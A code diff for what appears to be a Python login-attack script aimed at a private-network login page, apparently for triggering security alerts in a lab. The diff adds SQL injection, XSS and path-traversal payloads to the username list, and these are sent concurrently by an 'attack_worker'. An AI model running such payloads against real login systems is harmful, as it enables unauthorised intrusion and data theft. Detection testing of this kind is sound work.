@@ -7,7 +7,13 @@ TARGET_URL = os.getenv("TARGET_URL", "https://10.10.100.4/login")
 LOGIN_TYPE = os.getenv("LOGIN_TYPE", "student")
 CONCURRENCY = int(os.getenv("CONCURRENCY", "15"))
 
-usernames = ["admin", "root", "professor", "aluno", "joao", "maria", "pedro", "test", "user", "guest"]
+usernames = [
+    "admin", "root", "professor", "aluno", 
+    "admin' OR '1'='1", "' UNION SELECT 1,2,3--", # SQLi payloads para disparar alertas
+    "admin'--", "admin' #",
+    "<script>alert(1)</script>", # XSS payload
+    "../../etc/passwd" # Path traversal payload
+]
 
 async def attack_worker(worker_id):
     async with httpx.AsyncClient(verify=False, timeout=5.0) as client:
